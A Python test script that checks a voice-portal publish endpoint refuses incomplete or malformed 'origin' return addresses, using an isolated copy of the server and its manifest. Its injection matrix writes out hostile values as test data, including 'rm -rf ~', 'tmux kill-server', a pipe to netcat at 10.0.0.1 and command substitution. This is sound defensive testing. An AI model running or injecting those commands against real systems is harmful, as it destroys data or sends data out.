#!/usr/bin/env python3
"""Negative proof for the publish origin gate — POST /api/voice/publish.

Everything runs against a COPY of messages.json in a temp dir. The real
manifest (407 records on 2026-08-08, untracked by git) is opened read-only,
hashed at the start and re-hashed at the end; if this suite ever changes a byte
of it, the run fails with exit 4 and says so before anything else.

WHY THIS SHAPE. Three traps make a naive gate suite pass while proving nothing,
and each one is defused explicitly here:

  1. A MISSING ROUTE ANSWERS 404, AND 404 IS NOT A REFUSAL. Every negative case
     below wants "not 2xx". An unimplemented endpoint gives exactly that, so a
     suite written the obvious way goes green against a server with no gate in
     it at all. Refusals are therefore only accepted as 4xx EXCLUDING 404/405,
     and a probe runs first: if the route is absent the whole plan is printed as
     `n/i` and the run exits 3 — never green.

  2. THE CONTRACT HELP NAMES EVERY FIELD, SO SEARCHING THE WHOLE BODY IS
     VACUOUS. ORIGIN_CONTRACT_HELP mentions user, host, cwd, session, workspace
     and pane. If the refusal body carries it — and it should — then grepping
     the body for "workspace" succeeds even when the gate never noticed
     workspace was missing. So `problem_region()` strips the help block and
     matches only the part that states what was wrong. A gate that returns help
     text alone, with no per-field problems, FAILS these rows on purpose.

  3. "THE FILE DID NOT CHANGE" IS ALSO WHAT A BROKEN CHECK SAYS. Before
     trusting a single byte-identity assertion, the harness makes the server
     perform a real write through an endpoint that already exists and asserts
     the hash MOVES. If that control does not move, the byte-identity rows are
     meaningless and the suite says so rather than counting them as passes.

The isolation trick: server.js derives MESSAGES_FILE, AUDIO_DIR and SSL_DIR
from `__dirname`, and takes only PORT from the environment. There is no
MESSAGES_FILE env var. So isolation is achieved by relocating the server rather
than configuring it — server.js, lib/, ssl/ and agents/ are copied into a temp
tree with node_modules symlinked, and the copy reads and writes the temp
manifest and a temp, initially EMPTY audio dir. An empty audio dir makes
"a refused publish left an orphan .mp3" a matter of counting files.

The origin used for the positive control is READ from this process's live
herdr/tmux environment, never composed — the same rule the contract states for
publishers, applied to the test that exercises it.

Usage:
    python3 scripts/test-publish-gate.py
    python3 scripts/test-publish-gate.py --keep        # keep the temp tree
    python3 scripts/test-publish-gate.py --publish-path /api/voice/publish

Exit codes:
    0  every gate assertion held
    1  at least one gate assertion failed
    2  the isolated server could not be started
    3  the publish route does not exist yet — nothing was proven
    4  the REAL messages.json changed during the run (should be impossible)
"""

from __future__ import annotations

import argparse
import atexit
import hashlib
import json
import os
import re
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
REAL_MANIFEST = REPO / "messages.json"
REAL_AUDIO = REPO / "audio"

# ── the one block to edit if the handler names its fields differently ────────
PUBLISH_PATH = "/api/voice/publish"
STATIC_TEXT = "publish gate negative-proof — not a real voice"
# The handler takes an ALREADY-RENDERED file: the publisher synthesises audio
# first, then asks permission to enter the manifest. It must match
# /^audio\/[\w.-]+$/ or the request is rejected for a reason unrelated to origin.
STATIC_AUDIO = "audio/gate-test-placeholder.mp3"


def make_body(origin, text: str = STATIC_TEXT, audio_file: str = STATIC_AUDIO) -> dict:
    """The envelope a publisher sends. text / lang / persona mirror the record
    written by scripts/tts-generate.py; `origin` is the field being gated."""
    body = {"text": text, "lang": "en", "persona": "synth"}
    if audio_file is not OMIT:
        body["audio_file"] = audio_file
    if origin is not OMIT:
        body["origin"] = origin
    return body


# ─────────────────────────────────────────────────────────────────────────────

OMIT = object()  # distinguishes "origin: null" from "no origin key at all"

# Markers from ORIGIN_CONTRACT_HELP in
# /usr/local/src/mightyeagle/packages/voice/src/origin.ts (~line 314).
HELP_MARKERS = (
    "origin must declare where you are and how to be answered",
    "DO NOT COMPOSE THESE VALUES",
)

PASS, FAIL, INFO, ENV, NI = "✓", "✗", "·", "⚠", "n/i"

results: list[tuple[str, str, str, str]] = []
route_missing = False


def record(case: str, expected: str, mark: str, actual: str) -> None:
    results.append((case, expected, mark, actual))


# ── live values, read rather than composed ──────────────────────────────────


def detect_live_origin() -> tuple[dict, dict, str]:
    """A complete tmux origin and a complete herdr origin, from this process.

    A gate that probes the live multiplexer inventory (the contract says it
    does) would refuse an invented session, and the positive control would fail
    for a reason that has nothing to do with the code under test. So these are
    read from the environment that is actually running this suite.
    """
    user = os.environ.get("USER") or os.environ.get("LOGNAME") or "gmusic"
    try:
        host = subprocess.run(
            ["hostname", "-s"], capture_output=True, text=True, timeout=5
        ).stdout.strip()
    except Exception:
        host = ""
    host = host or socket.gethostname().split(".")[0]
    cwd = str(REPO)
    provenance = []

    # tmux: prefer the session this process sits in, else the first live one.
    session = ""
    try:
        session = subprocess.run(
            ["tmux", "display-message", "-p", "#{session_name}"],
            capture_output=True, text=True, timeout=5,
        ).stdout.strip()
    except Exception:
        session = ""
    if not session:
        try:
            listed = subprocess.run(
                ["tmux", "list-sessions", "-F", "#{session_name}"],
                capture_output=True, text=True, timeout=5,
            ).stdout.strip().splitlines()
            session = listed[0].strip() if listed else ""
        except Exception:
            session = ""
    if session:
        provenance.append(f"tmux session={session} (live)")
    else:
        session = "stcbot"
        provenance.append("tmux session=stcbot (no live tmux; composed)")

    tmux_origin = {
        "user": user, "host": host, "cwd": cwd,
        "multiplexer": "tmux", "session": session,
    }
    pane = os.environ.get("TMUX_PANE", "").strip()
    if pane:
        tmux_origin["pane"] = pane

    # herdr: $HERDR_* holds the truth when we are inside a pane.
    ws = os.environ.get("HERDR_WORKSPACE_ID", "").strip()
    hpane = os.environ.get("HERDR_PANE_ID", "").strip()
    sock = os.environ.get("HERDR_SOCKET_PATH", "").strip()
    if sock:
        default_sock = str(Path.home() / ".config/herdr/herdr.sock")
        hsession = "default" if sock == default_sock else Path(sock).parent.name
    else:
        hsession = "default"
    if ws and hpane:
        provenance.append(f"herdr workspace={ws} pane={hpane} session={hsession} (live)")
    else:
        ws, hpane = ws or "w1Y", hpane or "%127"
        provenance.append(f"herdr workspace={ws} pane={hpane} (composed)")

    herdr_origin = {
        "user": user, "host": host, "cwd": cwd,
        "multiplexer": "herdr", "session": hsession,
        "workspace": ws, "pane": hpane,
    }
    return tmux_origin, herdr_origin, "; ".join(provenance)


# ── the isolated server ─────────────────────────────────────────────────────


class Harness:
    """server.js, relocated so that `__dirname` points at a temp tree."""

    def __init__(self, keep: bool = False):
        self.keep = keep
        self.work = Path(tempfile.mkdtemp(prefix="voice-publish-gate-"))
        self.manifest = self.work / "messages.json"
        self.audio = self.work / "audio"
        self.log = self.work / "server.log"
        self.proc: subprocess.Popen | None = None
        self.port = 0
        self.base = ""

    def build(self) -> None:
        shutil.copy2(REPO / "server.js", self.work / "server.js")
        for d in ("lib", "ssl", "agents"):
            src = REPO / d
            if src.exists():
                shutil.copytree(src, self.work / d)
        nm = self.work / "node_modules"
        if not nm.exists():
            nm.symlink_to(REPO / "node_modules")
        self.audio.mkdir(exist_ok=True)          # empty: orphans become countable
        shutil.copy2(REAL_MANIFEST, self.manifest)  # a copy, never the original

    @staticmethod
    def _free_port() -> int:
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        return port

    def start(self, timeout: float = 40.0) -> bool:
        self.port = self._free_port()
        self.base = f"https://127.0.0.1:{self.port}"
        env = dict(os.environ, PORT=str(self.port))
        # cwd is the temp tree, so dotenv finds no .env and no real credentials
        # are loaded into the process under test.
        with open(self.log, "w") as logf:
            self.proc = subprocess.Popen(
                ["node", "server.js"],
                cwd=str(self.work), env=env,
                stdout=logf, stderr=subprocess.STDOUT,
                start_new_session=True,
            )
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if self.proc.poll() is not None:
                return False
            try:
                status, _ = http("GET", self.base + "/api/messages", None, timeout=2)
                if status == 200:
                    return True
            except Exception:
                pass
            time.sleep(0.25)
        return False

    def stop(self) -> None:
        if self.proc and self.proc.poll() is None:
            try:
                os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
                self.proc.wait(timeout=10)
            except Exception:
                try:
                    os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
                except Exception:
                    pass
        if not self.keep:
            shutil.rmtree(self.work, ignore_errors=True)

    # observable state -------------------------------------------------------

    def manifest_sha(self) -> str:
        return hashlib.sha256(self.manifest.read_bytes()).hexdigest()

    def manifest_count(self):
        try:
            return len(json.loads(self.manifest.read_text())["messages"])
        except Exception as e:
            return f"UNPARSEABLE ({type(e).__name__})"

    def audio_set(self) -> set[str]:
        return set(os.listdir(self.audio)) if self.audio.exists() else set()

    def render_audio(self, tag: str) -> str:
        """Stand in for the publisher having already synthesised a file. The real
        flow renders first and then asks permission, so a refusal always happens
        with bytes already on the caller's disk."""
        name = f"20260808_000000_000000_en_{tag}.mp3"
        (self.audio / name).write_bytes(b"\x00" * 64)
        return f"audio/{name}"

    def manifest_mentions(self, needle: str) -> bool:
        return needle in self.manifest.read_text()

    def stray_locks(self) -> list[str]:
        return sorted(p.name for p in self.work.glob("messages.json*.lock")) + sorted(
            p.name for p in self.work.glob(".messages.json.*.tmp")
        )


# ── http ────────────────────────────────────────────────────────────────────

_TLS = ssl._create_unverified_context()  # the portal serves a self-signed cert


def http(method: str, url: str, obj, timeout: float = 30.0) -> tuple[int, str]:
    data = None
    headers = {}
    if obj is not None:
        data = json.dumps(obj).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_TLS) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        return 0, f"URLError: {e.reason}"


def publish(h: Harness, origin, timeout: float = 30.0, **kw) -> tuple[int, str]:
    return http("POST", h.base + PUBLISH_PATH, make_body(origin, **kw), timeout=timeout)


def publish_raw(h: Harness, body: dict, timeout: float = 30.0) -> tuple[int, str]:
    """For envelopes make_body cannot express — a forged field, a missing text."""
    return http("POST", h.base + PUBLISH_PATH, body, timeout=timeout)


# ── reading a refusal ───────────────────────────────────────────────────────


def problem_region(raw: str) -> str:
    """The part of a refusal that says WHAT WAS WRONG, with the contract help
    removed. Without this the field-name assertions are self-fulfilling: the
    help text names every field the contract knows about."""
    region = raw
    try:
        parsed = json.loads(raw)
    except Exception:
        parsed = None

    if isinstance(parsed, dict):
        for key in ("problems", "errors", "missing", "refusals", "details"):
            val = parsed.get(key)
            if isinstance(val, list) and val:
                return " | ".join(str(v) for v in val)
        chunks = [
            str(parsed[k])
            for k in ("error", "message", "reason", "refused", "detail")
            if isinstance(parsed.get(k), str)
        ]
        if chunks:
            region = "\n".join(chunks)

    for marker in HELP_MARKERS:
        idx = region.find(marker)
        if idx != -1:
            region = region[:idx]
    return region


def carries_contract(raw: str) -> bool:
    if any(m in raw for m in HELP_MARKERS):
        return True
    # A gate may reproduce the contract without William's exact prose; require
    # that it at least states the legal multiplexers and the always-required set.
    low = raw.lower()
    return (
        "tmux" in low and "herdr" in low
        and sum(f in low for f in ("user", "host", "cwd", "multiplexer")) >= 3
    )


def is_refusal(status: int) -> bool:
    """A refusal is a 4xx the gate chose. 404/405 mean 'no such route' — the
    single most likely way this suite could go green against nothing."""
    return 400 <= status < 500 and status not in (404, 405)


# ── the assertions ──────────────────────────────────────────────────────────


def expect_refused(h: Harness, case: str, origin, names=(), want_contract=True,
                   expected: str = "refused") -> None:
    """One refusal case, plus the invariants every refusal must satisfy:
    the manifest byte-identical, no new audio, no lock or temp file left."""
    if route_missing:
        record(case, expected, NI, "route absent — not exercised")
        return

    sha_before, audio_before = h.manifest_sha(), h.audio_set()
    status, raw = publish(h, origin)
    sha_after, audio_after = h.manifest_sha(), h.audio_set()

    problems: list[str] = []
    if status == 0:
        problems.append(f"no response ({raw[:40]})")
    elif not is_refusal(status):
        problems.append(
            f"status {status} is not a refusal"
            + (" (route missing)" if status in (404, 405) else "")
        )

    region = problem_region(raw)
    unnamed = [n for n in names if not re.search(rf"\b{re.escape(n)}\b", region, re.I)]
    if unnamed:
        problems.append("does not name " + ", ".join(unnamed))

    if want_contract and not carries_contract(raw):
        problems.append("body carries no contract text")

    if sha_after != sha_before:
        problems.append("MANIFEST CHANGED")
    new_audio = audio_after - audio_before
    if new_audio:
        problems.append(f"orphan audio {sorted(new_audio)[:2]}")
    strays = h.stray_locks()
    if strays:
        problems.append(f"left {strays}")

    if problems:
        record(case, expected, FAIL, f"{status} — " + "; ".join(problems))
    else:
        shown = " ".join(region.split())[:52]
        record(case, expected, PASS, f"{status} · {shown}" if shown else str(status))


def main() -> int:
    global route_missing

    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--keep", action="store_true", help="keep the temp tree")
    ap.add_argument("--publish-path", default=PUBLISH_PATH)
    args = ap.parse_args()

    globals()["PUBLISH_PATH"] = args.publish_path

    if not REAL_MANIFEST.exists():
        print(f"real manifest missing: {REAL_MANIFEST}", file=sys.stderr)
        return 2

    # Recorded first, compared last. This suite must be incapable of touching it.
    real_sha = hashlib.sha256(REAL_MANIFEST.read_bytes()).hexdigest()
    real_records = len(json.loads(REAL_MANIFEST.read_text())["messages"])
    real_audio_n = len(os.listdir(REAL_AUDIO)) if REAL_AUDIO.exists() else 0

    tmux_origin, herdr_origin, provenance = detect_live_origin()

    h = Harness(keep=args.keep)
    atexit.register(h.stop)
    h.build()

    print("♠️🌿🎸🧵 PUBLISH GATE — NEGATIVE PROOF")
    print(f"  real manifest   {REAL_MANIFEST}  ({real_records} records, untouched)")
    print(f"  temp copy       {h.manifest}")
    print(f"  origin values   {provenance}")

    if not h.start():
        print("\nCOULD NOT START THE ISOLATED SERVER — nothing was tested.")
        print(h.log.read_text()[-2000:] if h.log.exists() else "(no log)")
        return 2
    print(f"  isolated server {h.base}  (PORT={h.port})\n")

    # ── harness controls, before any assertion is trusted ───────────────────

    seeded = h.manifest_count()
    record("harness · temp copy carries the real record count",
           f"{real_records}", PASS if seeded == real_records else FAIL, f"{seeded}")

    served = "?"
    status, raw = http("GET", h.base + "/api/messages", None)
    try:
        served = len(json.loads(raw)["messages"])
    except Exception:
        pass
    record("harness · server reads the TEMP manifest, not the real one",
           f"{real_records}", PASS if served == real_records else FAIL, f"serves {served}")

    # Does the route exist at all? Everything negative hinges on this.
    probe_status, probe_raw = publish(h, tmux_origin, timeout=60)
    route_missing = probe_status in (404, 405) or probe_status == 0
    record("precondition · POST %s exists" % PUBLISH_PATH, "not 404",
           FAIL if route_missing else PASS,
           f"{probe_status}" + (" — NOT IMPLEMENTED" if route_missing else ""))

    # ── the gate ───────────────────────────────────────────────────────────

    expect_refused(h, "no origin key at all", OMIT, names=("origin",))
    expect_refused(h, "origin: null", None, names=("origin",))
    expect_refused(h, "origin is a string, not an object", "gmusic@eury",
                   names=("origin",))
    expect_refused(h, "origin is an empty object", {},
                   names=("user", "host", "cwd", "multiplexer"))

    base = dict(tmux_origin)
    expect_refused(h, "user missing", {k: v for k, v in base.items() if k != "user"},
                   names=("user",))
    expect_refused(h, "host missing", {k: v for k, v in base.items() if k != "host"},
                   names=("host",))
    expect_refused(h, "cwd missing", {k: v for k, v in base.items() if k != "cwd"},
                   names=("cwd",))
    expect_refused(h, "user+host+cwd missing → all three named",
                   {"multiplexer": "tmux", "session": base["session"]},
                   names=("user", "host", "cwd"))
    expect_refused(h, "user is empty string", {**base, "user": ""}, names=("user",))
    expect_refused(h, "user is a number, not a string", {**base, "user": 1234},
                   names=("user",))

    expect_refused(h, "multiplexer missing",
                   {k: v for k, v in base.items() if k != "multiplexer"},
                   names=("multiplexer",))
    expect_refused(h, 'multiplexer "none" (policy, not a bug)',
                   {**base, "multiplexer": "none"}, names=("multiplexer",))
    # "none" is not a typo for a legal value, it is a legal SHAPE that publish
    # declines — the caller must learn that the address is the point, not that it
    # misspelled "tmux". A gate that lets "none" fall through to the generic
    # "not one of tmux, herdr" branch still refuses, so the row above stays green;
    # this row is what notices the reason went missing.
    if route_missing:
        record('"none" refusal explains why, not just "not one of"', "names steering",
               NI, "route absent — not exercised")
    else:
        _, raw = publish(h, {**base, "multiplexer": "none"})
        region = problem_region(raw)
        explains = re.search(r"steer|answer|reply|respond|nobody", region, re.I)
        record('"none" refusal explains why, not just "not one of"', "names steering",
               PASS if explains else FAIL,
               " ".join(region.split())[:58] if region else "(no problem text)")
    expect_refused(h, 'multiplexer "screen" (not in contract)',
                   {**base, "multiplexer": "screen"}, names=("multiplexer",))

    expect_refused(h, "tmux without session",
                   {k: v for k, v in base.items() if k != "session"},
                   names=("session",))
    hb = dict(herdr_origin)
    expect_refused(h, "herdr without workspace",
                   {k: v for k, v in hb.items() if k != "workspace"},
                   names=("workspace",))
    expect_refused(h, "herdr without pane",
                   {k: v for k, v in hb.items() if k != "pane"}, names=("pane",))
    expect_refused(h, "herdr without workspace+pane → both named",
                   {k: v for k, v in hb.items() if k not in ("workspace", "pane")},
                   names=("workspace", "pane"))
    expect_refused(h, "herdr without session (steers wrong session)",
                   {k: v for k, v in hb.items() if k != "session"},
                   names=("session",))

    # ── injection: these values reach tmux/herdr command plans ─────────────
    # Allowed by the contract's sanitizer: A-Z a-z 0-9 . _ : @ / % - , 1..200.
    vectors = [
        ("semicolon + command", "gmusic; rm -rf ~"),
        ("&& chain", "gmusic && tmux kill-server"),
        ("pipe to netcat", "gmusic | nc 10.0.0.1 1337"),
        ("command substitution", "$(id)"),
        ("backtick substitution", "`id`"),
        ("embedded newline + send-keys", "gmusic\ntmux send-keys -t 0 'rm -rf ~' Enter"),
        ("carriage return", "gmusic\r\nX-Injected: 1"),
        ("single quote break-out", "gmu'sic"),
        ("double quote break-out", 'gmu"sic'),
        ("space", "gmusic pwned"),
        ("null byte", "gmusic\x00root"),
        ("300 chars (limit is 200)", "a" * 300),
        ("cyrillic homoglyph", "gmusiс"),
    ]
    fields = ["user", "host", "cwd", "session", "workspace", "pane"]
    for label, payload in vectors:
        if route_missing:
            record(f"injection · {label}", "refused in 6 fields", NI,
                   "route absent — not exercised")
            continue
        leaked, changed, orphaned = [], False, False
        sha_before, audio_before = h.manifest_sha(), h.audio_set()
        for f in fields:
            status, raw = publish(h, {**hb, f: payload})
            if not is_refusal(status):
                leaked.append(f"{f}={status}")
        if h.manifest_sha() != sha_before:
            changed = True
        if h.audio_set() - audio_before:
            orphaned = True
        if leaked or changed or orphaned:
            detail = ", ".join(leaked) or "all refused"
            if changed:
                detail += " · MANIFEST CHANGED"
            if orphaned:
                detail += " · orphan audio"
            record(f"injection · {label}", "refused in 6 fields", FAIL, detail)
        else:
            record(f"injection · {label}", "refused in 6 fields", PASS,
                   "refused in user/host/cwd/session/workspace/pane")

    # ── the positive control: the gate must also let a good publish through ─

    # ── the gate must be the FIRST door, not one of several ────────────────
    # The handler's own comment says a refused publish costs a round trip and
    # nothing else. If envelope validation ran first, a publisher with no return
    # address would be told about `text` and never learn it must declare itself.
    if route_missing:
        record("bad origin + empty envelope → origin named first", "origin, not text",
               NI, "route absent — not exercised")
    else:
        status, raw = publish_raw(h, {"origin": {"multiplexer": "none"}})
        region = problem_region(raw)
        names_origin = re.search(r"\borigin\b|\bmultiplexer\b", region, re.I)
        only_envelope = re.search(r"\btext is required\b|\baudio_file\b", region, re.I)
        ok = is_refusal(status) and names_origin and not only_envelope
        record("bad origin + empty envelope → origin named first", "origin, not text",
               PASS if ok else FAIL,
               f"{status} · " + " ".join(region.split())[:56])

    # ── the positive control: the gate must also let a good publish through ─

    if route_missing:
        for c in ("complete tmux origin → ACCEPTED",
                  "complete herdr origin → ACCEPTED",
                  "accepted publish appends exactly one record",
                  "accepted record carries origin (steerable)",
                  "server renders no audio of its own",
                  "forged origin.reach is not trusted"):
            record(c, "2xx / stored", NI, "route absent — not exercised")
    else:
        for label, origin in (("tmux", tmux_origin), ("herdr", herdr_origin)):
            n_before, audio_before = h.manifest_count(), h.audio_set()
            rendered = h.render_audio(f"ok{label}")
            status, raw = publish(h, origin, timeout=120, audio_file=rendered)
            n_after = h.manifest_count()
            case = f"complete {label} origin → ACCEPTED"
            if 200 <= status < 300:
                record(case, "2xx", PASS, f"{status} · {n_before} → {n_after} records")
                if label == "tmux":
                    grew = isinstance(n_after, int) and isinstance(n_before, int) \
                        and n_after == n_before + 1
                    record("accepted publish appends exactly one record", "+1",
                           PASS if grew else FAIL, f"{n_before} → {n_after}")
                    # The caller renders; the server must not invent files.
                    invented = h.audio_set() - audio_before - {Path(rendered).name}
                    record("server renders no audio of its own", "0 new files",
                           PASS if not invented else FAIL,
                           f"{len(invented)} invented" if invented
                           else "only the caller's file")
                    try:
                        rec = json.loads(h.manifest.read_text())["messages"][-1]
                        stored = rec.get("origin")
                        ok = isinstance(stored, dict) and str(
                            json.dumps(stored)).find(origin["session"]) != -1
                        record("accepted record carries origin (steerable)",
                               "origin stored", PASS if ok else FAIL,
                               "origin present" if ok else f"origin={stored!r}")
                    except Exception as e:
                        record("accepted record carries origin (steerable)",
                               "origin stored", FAIL, f"{type(e).__name__}")
            elif is_refusal(status) and re.search(r"origin|multiplex|contract",
                                                  raw, re.I):
                record(case, "2xx", FAIL,
                       f"{status} — gate refused a VALID origin: "
                       + " ".join(problem_region(raw).split())[:60])
            else:
                record(case, "2xx", ENV,
                       f"{status} — not an origin refusal (envelope/env?): "
                       + " ".join(raw.split())[:60])

        # `reach` is the server's verdict on whether the address can be answered.
        # A publisher that could set it could mint a steerable-looking voice.
        forged = {**tmux_origin, "host": "not-a-real-host", "reach": "steerable",
                  "attested": True}
        rendered = h.render_audio("forge")
        status, raw = publish(h, forged, timeout=120, audio_file=rendered)
        if 200 <= status < 300:
            try:
                stored = json.loads(h.manifest.read_text())["messages"][-1].get(
                    "origin", {})
                reach = stored.get("reach")
                ok = reach != "steerable"
                record("forged origin.reach is not trusted", "not steerable",
                       PASS if ok else FAIL, f"stored reach={reach!r}")
            except Exception as e:
                record("forged origin.reach is not trusted", "not steerable", FAIL,
                       f"{type(e).__name__}")
        else:
            record("forged origin.reach is not trusted", "not steerable", INFO,
                   f"{status} — publish refused, reach never stored")

        # The sanitizer trims BEFORE it validates, so "  gmusic  " is legal. That
        # is only safe while the SANITISED value is what gets stored — if the
        # handler ever persists req.body.origin as it arrived, padded and raw
        # values would ride into the tmux/herdr command plans that these fields
        # feed, and every row in the injection matrix above would still be green.
        padded = {**tmux_origin, "user": f"  {tmux_origin['user']}  "}
        rendered = h.render_audio("trim")
        status, raw = publish(h, padded, timeout=120, audio_file=rendered)
        if 200 <= status < 300:
            try:
                stored = json.loads(h.manifest.read_text())["messages"][-1]["origin"]
                val = stored.get("user", "")
                ok = val == val.strip() and val == tmux_origin["user"]
                record("padded value is stored sanitised, not raw", "no whitespace",
                       PASS if ok else FAIL, f"stored user={val!r}")
            except Exception as e:
                record("padded value is stored sanitised, not raw", "no whitespace",
                       FAIL, f"{type(e).__name__}")
        else:
            record("padded value is stored sanitised, not raw", "no whitespace",
                   INFO, f"{status} — padding refused outright")

        # Documented, not asserted: the gate proves a return address exists, and
        # says nothing about whether the audio does. A record may point at a file
        # that was never rendered — a voice with an answerable sender and nothing
        # to hear. Whether that is acceptable is Jerry's call, not this suite's.
        status, raw = publish(h, tmux_origin, timeout=120,
                              audio_file="audio/never-rendered-by-anyone.mp3")
        record("· audio_file existence is not verified", "documented", INFO,
               f"{status} — " + ("accepted; record points at a missing file"
                                 if 200 <= status < 300 else "refused"))

    # ── a refusal must not leave a record pointing at the caller's audio ───

    if route_missing:
        record("refused publish leaves no record for its audio", "no reference", NI,
               "route absent — not exercised")
    else:
        rendered = h.render_audio("orphan")
        sha_before = h.manifest_sha()
        status, raw = publish(h, {**tmux_origin, "multiplexer": "none"},
                              audio_file=rendered)
        referenced = h.manifest_mentions(Path(rendered).name)
        unchanged = h.manifest_sha() == sha_before
        ok = is_refusal(status) and not referenced and unchanged
        record("refused publish leaves no record for its audio", "no reference",
               PASS if ok else FAIL,
               f"{status} · manifest {'unchanged' if unchanged else 'CHANGED'}"
               + (", REFERENCED" if referenced else ", no reference"))
        # The file itself is the caller's to delete — the server never saw it.
        # tts-generate.py does exactly this on a refused append; a publisher that
        # forgets leaves a file the portal serves publicly forever.
        record("· audio cleanup after refusal is the CALLER's duty", "by contract",
               INFO, "server cannot delete what it did not render")

    # ── proof that the byte-identity assertions above were live ────────────

    sha_before = h.manifest_sha()
    status, raw = http("POST", h.base + "/api/messages/listen-all", {})
    moved = h.manifest_sha() != sha_before
    marked = ""
    try:
        marked = f"marked={json.loads(raw).get('marked')}"
    except Exception:
        marked = f"status={status}"
    record("control · a REAL write moves the hash (so ✓ above means something)",
           "hash changes", PASS if moved else FAIL,
           f"{marked}, hash {'moved' if moved else 'DID NOT MOVE'}")

    h.stop()

    # ── the real manifest must be exactly as we found it ───────────────────

    now_sha = hashlib.sha256(REAL_MANIFEST.read_bytes()).hexdigest()
    now_audio = len(os.listdir(REAL_AUDIO)) if REAL_AUDIO.exists() else 0
    real_ok = now_sha == real_sha
    record("safety · REAL messages.json byte-identical", real_sha[:12],
           PASS if real_ok else FAIL, now_sha[:12])
    record("safety · REAL audio dir unchanged", f"{real_audio_n} files",
           PASS if now_audio == real_audio_n else FAIL, f"{now_audio} files")

    # ── table ──────────────────────────────────────────────────────────────

    print(f"{'CASE':<54}{'EXPECTED':<22}{'':<4}{'ACTUAL'}")
    print("─" * 132)
    for case, expected, mark, actual in results:
        print(f"{case:<54}{expected:<22}{mark:<4}{actual}")
    print("─" * 132)

    fails = sum(1 for r in results if r[2] == FAIL)
    nis = sum(1 for r in results if r[2] == NI)
    envs = sum(1 for r in results if r[2] == ENV)
    passes = sum(1 for r in results if r[2] == PASS)
    print(f"{passes} passed · {fails} failed · {nis} not exercised · {envs} environmental")

    if not real_ok:
        print("\nSTOP — the REAL messages.json changed during this run.")
        print(f"  was {real_sha}\n  now {now_sha}")
        print(f"  a copy of how it started is in {REPO/'backups'}/")
        return 4

    if route_missing:
        print(f"\nNOTHING WAS PROVEN. POST {PUBLISH_PATH} answered "
              f"{probe_status} — the route does not exist yet, so every refusal "
              f"row above is unexercised rather than passing. Re-run once the "
              f"handler is mounted.")
        return 3

    if envs:
        print("\n⚠ environmental rows are not gate failures, but the positive "
              "control is unconfirmed while they stand — a gate that refuses "
              "everything would look identical on the negative rows.")

    if args.keep:
        print(f"\ntemp tree kept: {h.work}")

    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
